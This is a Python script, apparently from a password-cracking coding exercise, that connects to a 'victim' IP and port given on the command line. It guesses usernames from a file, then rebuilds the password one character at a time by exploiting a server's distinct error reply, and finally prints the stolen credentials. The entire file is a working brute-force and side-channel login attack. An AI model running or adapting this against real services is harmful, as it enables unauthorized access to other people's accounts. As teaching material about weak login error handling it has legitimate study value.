import socket
import argparse
import json
import string
import itertools


class Hacker:

    def __init__(self):
        self.socket = socket.socket()

    def connect(self, ip_address, sock):
        hostname = (ip_address, sock)
        self.socket.connect(hostname)

    def send_message(self, message):
        encoded_message = message.encode()
        self.socket.send(encoded_message)

    def receive_response(self):
        response = self.socket.recv(1024)
        response = response.decode()
        response = json.loads(response)
        return response

    def close_connection(self):
        self.socket.close()

    def __del__(self):
        self.socket.close()

def list_from_file_generator(filename):
    passwords = []
    with open(filename, 'r') as file:
        for line in file:
            passwords.append(line.rstrip())
    return passwords

# def capitalizations(s):
#     if s == '':
#         yield ''
#         return
#     for rest in capitalizations(s[1:]):
#         yield s[0].upper() + rest
#         if s[0].upper() != s[0].lower():
#             yield s[0].lower() + rest


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Let's hack them... Enter victim's IP_address and socket")
    parser.add_argument("ip_address")
    parser.add_argument("socket")

    args = parser.parse_args()

    if args.ip_address == "localhost":
        args.ip_address = "127.0.0.1"

    try:
        args.socket = int(args.socket)
    except ValueError:
        print("Socket must be integer value!")
        exit()

    hacky = Hacker()
    hacky.connect(args.ip_address, int(args.socket))

    login_credentials = {
        'login': 'admin',
        "password": ' '
    }
    success = False
    numbers = '01234567890'
    for login in list_from_file_generator("logins.txt"):
        login_credentials['login'] = login
        try:
            json_login = json.dumps(login_credentials)
            hacky.send_message(json_login)
            response = hacky.receive_response()
            if response == {"result": "Wrong password!"}:
                password = ""
                while not success:
                    for char in string.printable:
                        login_credentials['password'] = password + char
                        json_login = json.dumps(login_credentials)
                        hacky.send_message(json_login)
                        response = hacky.receive_response()
                        if response == {"result": "Connection success!"}:
                            success = True
                            break
                        elif response == {"result": "Exception happened during login"}:
                            password += char
            if success:
                break
        except ConnectionAbortedError:
            break
    print(json.dumps(login_credentials))